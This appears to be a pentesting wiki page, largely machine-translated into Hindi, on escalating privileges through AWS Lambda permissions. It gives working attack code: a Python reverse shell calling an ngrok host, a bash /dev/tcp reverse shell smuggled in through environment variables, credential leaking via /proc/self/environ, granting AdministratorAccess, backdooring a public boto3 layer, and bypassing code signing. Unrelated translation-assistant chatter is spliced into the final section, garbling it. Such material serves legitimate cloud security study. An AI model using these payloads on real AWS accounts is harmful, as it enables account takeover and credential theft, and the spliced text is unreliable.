# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

More info about lambda in:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Users with the **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`** permissions can escalate their privileges.\
वे **नया Lambda function बनाना और इसे एक मौजूदा IAM role असाइन करना** कर सकते हैं, जिससे उस role से जुड़े permissions function को मिल जाते हैं। उपयोगकर्ता फिर **इस Lambda function में कोड लिखना और अपलोड करना (उदाहरण के लिए rev shell के साथ)** कर सकता है।\
एक बार function सेटअप हो जाने पर, उपयोगकर्ता **इसके निष्पादन को ट्रिगर करना** और AWS API के माध्यम से Lambda function को invoke करके इच्छित क्रियाएँ कर सकता है। यह तरीका प्रभावी रूप से उपयोगकर्ता को Lambda function के जरिए अप्रत्यक्ष रूप से कार्य करने की अनुमति देता है, उस IAM role को दिए गए access स्तर के साथ जो उससे जुड़ा होता है।\\

A attacker could abuse this to get a **rev shell and steal the token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
आप lambda फ़ंक्शन से ही **abuse the lambda role permissions** भी कर सकते हैं.\
यदि lambda role के पास पर्याप्त permissions हों तो आप इसका उपयोग करके खुद को admin rights दे सकते हैं:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
बाहरी कनेक्शन की आवश्यकता के बिना lambda's role credentials को leak करना भी संभव है। यह आंतरिक कार्यों पर उपयोग होने वाली **Network isolated Lambdas** के लिए उपयोगी होगा। अगर अनजान security groups आपके reverse shells को फ़िल्टर कर रहे हैं, तो यह कोड का टुकड़ा आपको सीधे lambda के आउटपुट के रूप में credentials को leak करने की अनुमति देगा।
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**संभावित प्रभाव:** निर्दिष्ट किसी भी lambda सर्विस रोल पर सीधे privesc।

> [!CAUTION]
> ध्यान दें कि भले ही यह दिलचस्प लग सकता है, **`lambda:InvokeAsync`** **नहीं** अपने आप **निष्पादित `aws lambda invoke-async`** करने की अनुमति देता; आपको `lambda:InvokeFunction` भी चाहिए।

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

पिछले परिदृश्य की तरह, आप **खुद को `lambda:InvokeFunction` दे सकते हैं** यदि आपके पास **`lambda:AddPermission`** अनुमति है।
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** निर्दिष्ट किसी भी lambda service role पर सीधे privesc।

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

उन उपयोगकर्ताओं के पास **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** permissions हों (और संभवतः `dynamodb:PutItem` और `dynamodb:CreateTable`), तो वे बिना `lambda:InvokeFunction` के भी अप्रत्यक्ष रूप से **escalate privileges** कर सकते हैं.\
वे एक **दुष्ट कोड वाली Lambda function बना कर उसे किसी मौजूद IAM role पर असाइन** कर सकते हैं।

Lambda को सीधे invoke करने की बजाय, उपयोगकर्ता एक मौजूद DynamoDB table सेटअप या उपयोग करता है, और इसे event source mapping के माध्यम से Lambda से लिंक करता है। यह सेटअप सुनिश्चित करता है कि तालिका में किसी नए आइटम के दर्ज होते ही Lambda function **तालिका में किसी नए आइटम के दर्ज होते ही स्वतः ट्रिगर** हो जाए, चाहे वह उपयोगकर्ता की क्रिया से हो या किसी अन्य प्रक्रिया से; इस तरह Lambda function अप्रत्यक्ष रूप से invoke होगा और पास किए गए IAM role की अनुमतियों के साथ कोड execute करेगा।
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
यदि DynamoDB पहले से ही AWS environment में सक्रिय है, तो उपयोगकर्ता को केवल Lambda function के लिए **event source mapping स्थापित करने की आवश्यकता** है। हालाँकि, यदि DynamoDB उपयोग में नहीं है, तो उपयोगकर्ता को **streaming सक्षम करके एक नई table बनानी होगी**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
अब यह संभव है **Lambda function को DynamoDB table से जोड़ना** के द्वारा **event source mapping बनाकर**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
जब Lambda function को DynamoDB stream से लिंक किया गया है, तो attacker **DynamoDB stream को सक्रिय करके Lambda को परोक्ष रूप से ट्रिगर कर सकता है**। यह DynamoDB table में **एक आइटम डालकर** किया जा सकता है:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**संभावित प्रभाव:** निर्दिष्ट lambda सर्विस रोल पर सीधे privesc।

### `lambda:AddPermission`

इस permission के साथ एक हमलावर **खुद को (या दूसरों को) कोई भी अनुमति दे सकता है** (यह resource based policies जनरेट करता है जो resource तक access देने के लिए होते हैं):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**संभावित प्रभाव:** कोड को संशोधित करने और उसे चलाने की अनुमति देकर सीधे lambda service role पर privesc हासिल किया जा सकता है।

### `lambda:AddLayerVersionPermission`

इस permission वाले attacker स्वयं (या दूसरों को) **permission `lambda:GetLayerVersion` दे सकता है**। वह layer तक पहुँच सकता है और vulnerabilities या संवेदनशील जानकारी की तलाश कर सकता है।
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** संवेदनशील सूचना तक संभावित पहुँच।

### `lambda:UpdateFunctionCode`

जिस उपयोगकर्ता के पास **`lambda:UpdateFunctionCode`** permission है, उसके पास किसी IAM role से जुड़े मौजूदा Lambda function के कोड को संशोधित करने की क्षमता है।\
हमलावर **modify the code of the lambda to exfiltrate the IAM credentials** कर सकता है।

हालाँकि हमलावर के पास फ़ंक्शन को सीधे invoke करने की क्षमता नहीं हो सकती है, यदि Lambda function पहले से मौजूद और सक्रिय है, तो यह सम्भावित है कि यह मौजूदा workflows या events के माध्यम से trigger हो जाएगा, जिससे संशोधित कोड का अप्रत्यक्ष रूप से निष्पादन संभव हो जाता है।
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**संभावित प्रभाव:** उपयोग किए गए lambda service role पर सीधे privesc।

### `lambda:UpdateFunctionConfiguration`

#### RCE env variables के माध्यम से

इन अनुमतियों के साथ ऐसे environment variables जोड़ना संभव है जो Lambda को मनमाना कोड execute करने का कारण बनें। उदाहरण के लिए python में `PYTHONWARNING` और `BROWSER` जैसे environment variables का दुरुपयोग करके एक python process को arbitrary commands execute कराने के लिए प्रेरित किया जा सकता है:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
अन्य स्क्रिप्टिंग भाषाओं के लिए आप अन्य env variables उपयोग कर सकते हैं। अधिक जानकारी के लिए स्क्रिप्टिंग भाषाओं के उपखंड देखें:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) आपको आपके lamdba function में **code** शामिल करने की अनुमति देता है, लेकिन इसे अलग से स्टोर करके, जिससे function का code छोटा रह सकता है और कई functions कोड साझा कर सकते हैं।

Inside lambda आप उन paths की जांच कर सकते हैं जहाँ से python code लोड होता है, एक ऐसी function के साथ जैसा नीचे दिया गया है:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Exploitation

`lambda:UpdateFunctionConfiguration` का दुरुपयोग करके किसी lambda function में **add a new layer** करना संभव है। Arbitrary code चलाने के लिए इस layer में कुछ **library that the lambda is going to import.** मौजूद होना चाहिए। यदि आप lambda का कोड पढ़ सकते हैं तो आप इसे आसानी से ढूँढ सकते हैं। ध्यान दें कि संभव है कि lambda पहले से ही **already using a layer** हो और आप उस layer को **download** करके उसमें **add your code** कर सकें।

For example, lets suppose that the lambda is using the library boto3, this will create a local layer with the last version of the library:
```bash
pip3 install -t ./lambda_layer boto3
```
आप `./lambda_layer/boto3/__init__.py` खोल सकते हैं और **add the backdoor in the global code** (उदाहरण के लिए credentials exfiltrate करने या reverse shell पाने वाला एक फ़ंक्शन)।  

फिर, उस `./lambda_layer` डायरेक्टरी को zip करें और **upload the new lambda layer** अपने account में (या victim के account में, पर हो सकता है कि आपके पास permissions न हों)।\

ध्यान दें कि आपको एक python फ़ोल्डर बनाना होगा और लाइब्रेरीज़ वहाँ रखनी होंगी ताकि /opt/python/boto3 को override किया जा सके। साथ ही, layer को **compatible with the python version** होना चाहिए जो lambda उपयोग करता है, और अगर आप इसे अपने account में upload करते हैं, तो यह **same region:** में होना चाहिए।
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
अब अपलोड की गई lambda layer को **किसी भी खाते से पहुँच योग्य** बनाएं:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
और lambda layer को victim lambda function से जोड़ें:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
अगला कदम होगा या तो अगर हम कर सकें तो **फ़ंक्शन को invoke करना** या सामान्य तरीकों से यह **invoke हो जाने** तक इंतज़ार करना — जो अधिक सुरक्षित तरीका है।

एक **और stealth तरीका इस vulnerability को exploit करने का** यहाँ पाया जा सकता है:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** सीधे privesc उस lambda service role तक जिसका उपयोग किया गया।

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

शायद उन permissions के साथ आप एक function बना कर उसे URL कॉल करके execute कर सकते हैं... पर मैं इसे टेस्ट करने का तरीका नहीं ढूँढ पाया, इसलिए अगर आप करते हैं तो बताइए!

### Lambda MitM

कुछ lambdas parameters में users से भेजी जा रही **sensitive info receive कर रही होंगी।** यदि उन में से किसी में RCE मिल जाए, तो आप अन्य users जो info भेज रहे हैं उसे exfiltrate कर सकते हैं, इसे देखें:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

यदि किसी Lambda function पर code signing लागू है, तो एक attacker जो या तो Code Signing Config (CSC) को हटा सकता है या उसे Warn पर downgrade कर सकता है, वह function पर unsigned code deploy कर सकता है। यह फ़ंक्शन के IAM role या triggers को modify किए बिना integrity protections को bypass कर देता है।

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Path A) CSC हटाएँ फिर कोड अपडेट करें:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Path B) Warn पर डाउनग्रेड करें और कोड अपडेट करें (यदि delete की अनुमति नहीं है):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Verified.

I will:
- Translate relevant English text to Hindi.
- Keep code, hacking technique names, cloud/SaaS platform names (aws, gcp, Workspace, etc.), the words "leak" and "pentesting", links, paths, refs, and all markdown/html tags unchanged.
- Not modify tags like {#tabs}, {#tab ...}, {#ref}, or include paths.
- Output only the translated markdown content and nothing extra.

Please provide the file content to translate.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
संभावित प्रभाव: signed deployments लागू करने वाला माना गया function में arbitrary unsigned code को push और run करने की क्षमता, जो संभावित रूप से function role की permissions के साथ code execution की ओर ले जा सकती है।

सफाई:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

